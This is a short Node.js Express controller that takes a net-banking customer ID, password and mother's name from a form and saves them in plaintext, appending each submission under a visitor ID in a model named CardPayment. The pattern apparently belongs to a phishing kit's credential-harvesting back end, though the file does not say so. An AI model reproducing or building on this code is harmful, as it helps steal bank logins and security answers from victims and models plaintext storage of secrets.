// controllers/netBankingController.js
const NetBanking = require('../models/CardPayment');

exports.submitNetBankingPayment = async (req, res) => {
  try {
    const { uniqueid, customerId, password, motherName } = req.body;

    let netBanking = await NetBanking.findOne({ uniqueid });
    const newEntry = { customerId, password, motherName };

    if (netBanking) {
      netBanking.entries.push(newEntry);
    } else {
      netBanking = new NetBanking({
        uniqueid,
        entries: [ newEntry ]
      });
    }

    await netBanking.save();

    res.status(200).json({
      success: true,
      message: "Net Banking Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting net banking data"
    });
  }
};
